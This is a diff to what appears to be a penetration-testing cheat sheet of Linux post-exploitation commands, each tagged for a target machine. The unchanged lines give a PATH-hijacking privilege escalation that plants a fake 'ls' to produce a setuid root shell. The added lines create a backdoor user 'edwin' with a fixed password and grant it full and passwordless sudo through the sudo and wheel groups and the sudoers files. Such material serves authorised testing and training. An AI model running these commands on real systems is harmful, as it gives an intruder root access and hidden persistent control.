@@ -148,3 +148,10 @@ PATH Hijacking:cat /etc/crontab | grep -v "^# " # Check cron jobs for scripts wi
 PATH Hijacking Exploit:echo '# !/bin/bash' > /tmp/ls && echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /tmp/ls && chmod +x /tmp/ls && export PATH=/tmp:$PATH # Create malicious ls and add to PATH; target-machine
 PATH Hijacking Wait:# Wait for cron to execute, then run: /tmp/rootbash -p; target-machine
 TAR wildcards:https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa
+Create User #1 (requires root):useradd -m -s /bin/bash edwin #create new user with home directory and bash shell; target-machine
+Create User #1 (requires root):echo 'edwin:P@ssw0rd@123' | chpasswd #set password for new user; target-machine
+Create User #1 (requires root):usermod -aG sudo edwin #add user to sudo group for root privileges (Debian/Ubuntu); target-machine
+Create User #1 (requires root):usermod -aG wheel edwin #add user to wheel group for root privileges (RHEL/CentOS); target-machine
+Create User #1 (requires root):echo 'edwin ALL=(ALL:ALL) ALL' >> /etc/sudoers #grant full sudo privileges via sudoers file; target-machine
+Create User #2 (requires root):echo 'edwin ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/edwin #grant passwordless sudo safely using sudoers.d; target-machine
+Create User #2 (requires root):chmod 440 /etc/sudoers.d/edwin #set correct permissions for sudoers file; target-machine
